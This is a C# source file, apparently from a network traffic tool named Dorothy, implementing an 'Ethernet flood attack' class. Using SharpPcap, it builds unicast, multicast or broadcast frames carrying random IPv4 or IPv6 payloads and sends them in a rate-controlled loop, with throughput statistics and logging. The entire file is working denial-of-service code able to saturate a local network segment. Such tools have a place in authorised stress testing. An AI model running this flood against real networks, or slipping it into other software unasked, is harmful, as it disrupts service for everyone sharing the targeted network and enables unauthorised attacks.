using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using NLog;
using System.Diagnostics;

namespace Dorothy.Models
{
    public class EthernetFlood : IDisposable
    {
        private readonly PacketParameters _parameters;
        private readonly CancellationToken _cancellationToken;
        private readonly EthernetPacketType _packetType;
        private readonly bool _useIPv6;
        private LibPcapLiveDevice? _device;
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private const int PacketSize = 1400;
        private const int POOL_SIZE   = 32;

        public event EventHandler<PacketEventArgs>? PacketSent;

        public event EventHandler<Dorothy.Services.FloodSnapshot>? StatsPublished;

        public enum EthernetPacketType
        {
            Unicast,
            Multicast,
            Broadcast
        }

        public EthernetFlood(PacketParameters parameters, EthernetPacketType packetType, CancellationToken cancellationToken, bool useIPv6 = false)
        {
            _parameters = parameters;
            _packetType = packetType;
            _cancellationToken = cancellationToken;
            _useIPv6 = useIPv6 || parameters.SourceIp.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6;
        }

        protected virtual void OnPacketSent(byte[] packet, IPAddress sourceIp, IPAddress destinationIp, int port)
            => PacketSent?.Invoke(this, new PacketEventArgs(packet, sourceIp, destinationIp, port));

        protected virtual void OnStatsPublished(Dorothy.Services.FloodSnapshot snapshot)
            => StatsPublished?.Invoke(this, snapshot);

        public async Task StartAsync()
        {
            try
            {
                var allDevices = CaptureDeviceList.Instance;
                _device = allDevices.OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Interface.Addresses
                        .Any(a => a.Addr?.ipAddress?.ToString() == _parameters.SourceIp.ToString()));

                if (_device == null)
                {
                    throw new Exception("No suitable network interface found");
                }

                _device.Open();
                Logger.Info($"Started Ethernet {_packetType} flood attack ({(_useIPv6 ? "IPv6" : "IPv4")})");

                var samplePacket = CreatePacket();
                int totalPacketSize = samplePacket.Bytes.Length;

                int wirePacketSize = totalPacketSize + 4;
                long targetBytesPerSecond = _parameters.BytesPerSecond;
                double targetMbps = targetBytesPerSecond * 8.0 / 1_000_000;
                Logger.Info($"Ethernet {_packetType} ({(_useIPv6 ? "IPv6" : "IPv4")}) wire packet size: {wirePacketSize} bytes, Target rate: {targetMbps:F2} Mbps");

                var pool = new byte[POOL_SIZE][];
                for (int i = 0; i < POOL_SIZE; i++)
                    pool[i] = CreatePacket().Bytes;

                await Task.Run(() =>
                {
                    var scheduler = new Dorothy.Services.FloodScheduler(targetBytesPerSecond);
                    int poolIdx  = 0;
                    int regen    = 0;

                    int drainMax = targetMbps > 50 ? 50 : targetMbps > 10 ? 20 : 10;

                    const double α1s  = 0.393;
                    const double α5s  = 0.095;
                    const double α10s = 0.049;
                    double ema1s = 0, ema5s = 0, ema10s = 0;

                    long windowStartTick  = Stopwatch.GetTimestamp();
                    long windowStartBytes = 0;
                    long freq             = Stopwatch.Frequency;
                    long halfSecTicks     = freq / 2;
                    string protocol       = $"Ethernet/{_packetType}";

                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        int count = scheduler.Drain(wirePacketSize, drainMax);

                        if (count == 0)
                        {
                            if (targetMbps < 5.0) { Thread.Sleep(1); scheduler.RecordSleep(); }
                            else                   { Thread.SpinWait(100); scheduler.RecordSpin(); }
                        }
                        else
                        {
                            for (int i = 0; i < count; i++)
                            {
                                try
                                {

                                    if (++regen % 500 == 0)
                                        pool[poolIdx % POOL_SIZE] = CreatePacket().Bytes;

                                    var frame = pool[poolIdx % POOL_SIZE];
                                    _device!.SendPacket(frame);
                                    scheduler.RecordSent(wirePacketSize);

                                    if ((scheduler.SentPackets & 63) == 0)
                                        OnPacketSent(frame,
                                            _parameters.SourceIp, _parameters.DestinationIp,
                                            _parameters.DestinationPort);
                                }
                                catch (Exception ex)
                                {
                                    scheduler.RecordFailed();
                                    Logger.Warn($"[{protocol}] SendPacket failed: {ex.Message}");
                                }
                                poolIdx++;
                            }
                        }

                        long nowTick = Stopwatch.GetTimestamp();
                        if (nowTick - windowStartTick >= halfSecTicks)
                        {
                            double windowSec  = (nowTick - windowStartTick) / (double)freq;
                            long   windowByte = scheduler.TotalWireBytesSent - windowStartBytes;
                            double windowMbps = windowByte * 8.0 / (windowSec * 1_000_000.0);

                            ema1s  = ema1s  == 0 ? windowMbps : α1s  * windowMbps + (1 - α1s)  * ema1s;
                            ema5s  = ema5s  == 0 ? windowMbps : α5s  * windowMbps + (1 - α5s)  * ema5s;
                            ema10s = ema10s == 0 ? windowMbps : α10s * windowMbps + (1 - α10s) * ema10s;
                            scheduler.Mbps1s  = ema1s;
                            scheduler.Mbps5s  = ema5s;
                            scheduler.Mbps10s = ema10s;

                            scheduler.LastReason = scheduler.InferReason(targetBytesPerSecond);
                            OnStatsPublished(scheduler.TakeSnapshot(targetBytesPerSecond, protocol));

                            Logger.Info($"[{protocol}] target={targetMbps:F2}  " +
                                        $"window={windowMbps:F2}  {scheduler.DiagLine}");

                            windowStartTick  = nowTick;
                            windowStartBytes = scheduler.TotalWireBytesSent;
                        }
                    }

                    Logger.Info($"[{protocol}] Stopped. Final: {scheduler.DiagLine}");
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error($"Ethernet flood attack failed: {ex.Message}");
                throw;
            }
        }

        private Packet CreatePacket()
        {
            var ethernetPacket = CreateEthernetPacket();
            Packet ipPacket;

            if (_useIPv6)
            {
                ipPacket = CreateIPv6Packet();
            }
            else
            {
                ipPacket = CreateIPv4Packet();
            }

            ethernetPacket.PayloadPacket = ipPacket;
            return ethernetPacket;
        }

        private EthernetPacket CreateEthernetPacket()
        {
            PhysicalAddress destMac = _packetType switch
            {
                EthernetPacketType.Unicast => new PhysicalAddress(_parameters.DestinationMac),
                EthernetPacketType.Multicast => _useIPv6
                    ? PhysicalAddress.Parse("33-33-00-00-00-01")
                    : PhysicalAddress.Parse("01-00-5E-00-00-01"),
                EthernetPacketType.Broadcast => PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"),
                _ => throw new ArgumentException("Invalid Ethernet packet type")
            };

            var etherType = _useIPv6 ? EthernetType.IPv6 : EthernetType.IPv4;

            return new EthernetPacket(
                new PhysicalAddress(_parameters.SourceMac),
                destMac,
                etherType);
        }

        private IPv4Packet CreateIPv4Packet()
        {
            var payload = new byte[PacketSize];
            Random.Shared.NextBytes(payload);

            return new IPv4Packet(_parameters.SourceIp, _parameters.DestinationIp)
            {
                Protocol = ProtocolType.Raw,
                PayloadData = payload,
                TimeToLive = _parameters.Ttl
            };
        }

        private IPv6Packet CreateIPv6Packet()
        {
            var payload = new byte[PacketSize];
            Random.Shared.NextBytes(payload);

            return new IPv6Packet(_parameters.SourceIp, _parameters.DestinationIp)
            {
                PayloadData = payload,
                HopLimit = _parameters.Ttl
            };
        }

        public void Dispose()
        {
            if (_device != null)
            {
                if (_device.Opened)
                {
                    _device.Close();
                }
                _device.Dispose();
                Logger.Info("Ethernet flood device closed and disposed");
            }
        }
    }
} 